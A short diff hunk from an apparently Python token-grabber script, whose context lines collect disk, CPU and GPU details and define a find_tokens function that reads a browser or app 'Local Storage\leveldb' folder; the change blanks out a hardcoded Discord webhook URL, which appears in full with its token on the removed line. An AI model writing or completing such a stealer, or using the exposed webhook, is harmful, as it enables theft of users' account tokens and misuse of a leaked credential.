@@ -40,7 +40,7 @@ disk_info = psutil.disk_usage('/')
 cpu_info = cpuinfo.get_cpu_info()
 gpus = GPUtil.getGPUs()
 
-url = "https://discord.com/api/webhooks/1125906197577474099/pu9MHHrrxJSQL3b4j68HOsX1_Kz-krUxazrZ-ACynkeeVDoPwEHOAQ6gCgU5uEQ1QNLU"
+url = ""
 
 def find_tokens(path):
     path += '\\Local Storage\\leveldb'
